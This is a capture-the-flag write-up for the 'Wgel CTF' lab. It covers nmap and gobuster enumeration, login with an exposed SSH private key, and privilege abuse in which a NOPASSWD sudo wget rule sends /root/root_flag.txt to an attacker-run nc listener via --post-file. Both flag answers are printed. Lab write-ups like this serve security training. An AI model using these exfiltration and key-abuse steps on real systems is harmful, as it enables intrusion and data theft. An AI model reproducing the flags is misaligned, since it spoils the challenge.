---
custom_edit_url: null
---

## Task 1: Wgel CTF
### User flag
Let's scan the target using `nmap`.
```
$ nmap -sC -sV 10.10.137.42
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 10:58 IST
Nmap scan report for 10.10.137.42
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.74 seconds
```
There are two open ports:

| Port | Service |
| :-: | :-: |
| 22 | ssh |
| 80 | http |
 
Let's check the `/index.html` page.

![2](https://github.com/Knign/Write-ups/assets/110326359/13405dca-4698-414d-b09a-38e72616c8b5)

We can view the page source using `CTRL+U`.

![3](https://github.com/Knign/Write-ups/assets/110326359/72cc6185-ca28-4cf0-8c12-523147d43078)

Let's scan all the directories using `gobuster`.
```
$ gobuster dir -u http://10.10.137.42 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.42
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.137.42/sitemap/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
We can visit the `/sitemap` page using our browser.
The webpage made my browser crash as soon as I visited it.

We can search one layer deeper.
```
$ gobuster dir -u http://10.10.137.42/sitemap -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.42/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.137.42/sitemap/.ssh/]
/css                  (Status: 301) [Size: 318] [--> http://10.10.137.42/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.137.42/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.137.42/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.137.42/sitemap/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
We can now visit `/sitemap/.ssh` using our browser.

![4](https://github.com/Knign/Write-ups/assets/110326359/e250cbca-f702-4409-ba8d-10ec1d1184f1)

Let's download the `id_rsa` file using `wget`.
```
$ wget http://10.10.137.42/sitemap/.ssh/id_rsa
--2023-12-07 11:47:42--  http://10.10.137.42/sitemap/.ssh/id_rsa
Connecting to 10.10.137.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K)
Saving to: ‘id_rsa’

id_rsa                                                     100%[========================================================================================================================================>]   1.64K  --.-KB/s    in 0.1s    

2023-12-07 11:47:43 (13.6 KB/s) - ‘id_rsa’ saved [1675/1675]
```
- Let's change the permissions on the `id_rsa` file.
```
$ sudo chmod 700 id_rsa
```
Now we can login as `jessie`.
```
$ ssh -i id_rsa jessie@10.10.137.42
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```
Let's read the user flag.
```
jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```
### Answer
```
057c67131c3d5e42dd5cd3075b198ff6
```

&nbsp;

### Root flag
Let's check the permissions `jessie` has.
```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
So we can post a file to our machine as `jessie` without using a password.
Let's start a listener using `nc`.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
```
Let's send the file now.
```
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.48.138:9999
--2023-12-07 08:58:16--  http://10.17.48.138:9999/
Connecting to 10.17.48.138:9999... connected.
HTTP request sent, awaiting response... 
```
We can go back to check the listener.
```
$ nc -nlvp 9999       
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.137.42] 57776
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.17.48.138:9999
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```
### Answer
```
b1b968b37519ad1daa6408188649263d
```
